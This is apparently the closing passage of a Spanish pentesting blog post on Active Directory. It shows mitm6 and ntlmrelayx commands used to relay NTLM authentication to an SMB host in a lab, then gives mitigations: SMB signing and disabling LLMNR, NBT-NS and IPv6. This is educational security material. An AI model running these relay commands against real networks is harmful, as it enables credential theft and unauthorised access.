+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">mitm6 -i ens38 -d dev.evilcorp.local --ignore-nofqdn
+
+python3 ntlmrelayx.py -t smb://10.10.40.226 -wh 10.10.40.225 -smb2support -socks -debug
+ 
+</code></pre></div><p><img src="https://i.imgur.com/Ox6sYjj.png" alt=""></p>
+<p>como vemos en la imagen anterior, tenemos un relay capturado con la bandera de AdminStatus en True, o sea que podriamos utilizar  tranquilamente el relay para autenticarnos a ese host en particular con el usuario  **Samuel Adam **</p>
+<hr>
+<h2 id="mitigacion">Mitigacion</h2>
+<ol>
+<li>Habililitar las firmas de SMB</li>
+<li>Deshabilitar LLMNR</li>
+<li>Deshabilitar NBT-NS</li>
+<li>Deshabilitar IPV6</li>
+<li>Monitorear el trafico</li>
+</ol>
+<h3 id="habilitando-la-firma-de-smb">Habilitando la firma de SMB</h3>
+<p>habilitando la firma de smb evitaremos por completos los ataques de retransmision (relay) vistos anteriormente ya que el sujeto tendra que comprobar su autenticidad , basicamente es como agregarle un sello a nuestro paquetes generados por SMB que identifique quien es el destinatario.</p>
+<p>para esto podemos crear <strong>GPOS</strong> en el dominio o simplemente agregando la consiguración al equipo local afectado, nos vamos a las politicas de grupo</p>
+<p><code>Configuración del equipo/Políticas/Configuración de Windows/Configuración de seguridad/Políticas locales/Opciones de seguridad</code></p>
+<p>doble click en <strong>Servidor de red de Microsoft: Firmar digitalmente las comunicaciones (siempre)</strong> y habilitarlo.</p>
+<p>deben tener en cuenta que el trafico sera algo mas lento, ya que le estan agregando una capa de seguridad extra y tambien que no afecte a dispositivos heredados en la red</p>
+<p><img src="https://i.imgur.com/6HVYRNR.png" alt=""></p>
+<h3 id="deshabilitar-llmnr">Deshabilitar LLMNR</h3>
+<p><strong>Deshabilitar LLMNR y NTB-NS evitará que herramientas como Responder capturen las credenciales</strong></p>
+<p>Abra el Editor de políticas de grupo nuevamente  Vaya a  :</p>
+<p><code>Política de equipo local &gt; Configuración del equipo &gt; Plantillas administrativas &gt; Red &gt; Cliente DNS </code></p>
+<p>En Cliente DNS, asegúrese de que <strong>&ldquo;Desactivar resolución de nombre de multidifusión&rdquo;</strong> este en Habilitado</p>
+<p><img src="https://i.imgur.com/3Sb9qFp.png" alt=""></p>
+<h3 id="deshabilitar-nbt-ns">Deshabilitar NBT-NS</h3>
+<p>abra sus conexioes de red , va a la propiedad de su adaptador</p>
+<ol>
+<li>
+<p>selecciona el protocolo <strong>(TCP/IPV4)</strong> haga click en propiedades</p>
+</li>
+<li>
+<p>En la pestaña general, haga click en avanzado</p>
+</li>
+<li>
+<p>navegue hasta la pestaña &lsquo;WINS&rsquo; y luego desactive NetBios sobre &lsquo;TCP/IP&rsquo;</p>
+</li>
+</ol>
+<p><img src="https://i.imgur.com/1LE55ru.png" alt=""></p>
+<h3 id="desactivando-ipv6">Desactivando IPV6</h3>
+<ol>
+<li>
+<p>similar al metodo anterior nada mas que en las propiedades del adaptador y desactivamos el protocolo ipv6</p>
+</li>
+<li>
+<p>tambien puede especificarle a su DHCP server que no asigne direcciones por IPV6</p>
+</li>
+</ol>
+<p><img src="https://i.imgur.com/9VQGUxp.png" alt=""></p>
+<p>Llegamos al fin , gracias por tomarte el tiempo de leerlo =) &hellip; hemos dejado varias cosas en el tintero como kerberoast, asrproast, delegaciones restringidas, sin restricciones, pass the ticket, rcbd, GPOS, ShadowCredentials, Golden Tickets, Silver Tickets, Pivot que tocaremos en proximamente.</p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
